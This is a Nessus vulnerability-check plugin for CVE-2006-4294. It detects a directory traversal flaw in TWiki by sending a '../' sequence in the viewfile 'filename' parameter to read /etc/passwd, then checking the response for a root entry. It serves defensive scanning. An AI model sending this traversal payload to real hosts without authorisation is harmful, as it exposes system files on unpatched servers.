#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a Perl script that is prone to a
directory traversal attack. 

Description :

The version of TWiki on the remote host allows directory traversal
sequences in the 'filename' parameter in the 'viewfile' function of
'lib/TWiki/UI/View.pm'.  An unauthenticated attacker can leverage this
flaw to view arbitrary files on the remote host subject to the
privileges of the web server user id. 

See also :

http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2006-4294
http://sourceforge.net/mailarchive/forum.php?thread_id=30468855&forum_id=3703

Solution :

Apply Hotfix 3 for TWiki-4.0.4.

Risk factor :

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";


if (description)
{
  script_id(22362);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-4294");
  script_bugtraq_id(19907);

  script_name(english:"TWiki filename Parameter Directory Traversal Vulnerability");
  script_summary(english:"Tries to read a local file with TWiki");

  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/viewfile/TWiki/TWikiDocGraphics?",
      "filename=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}

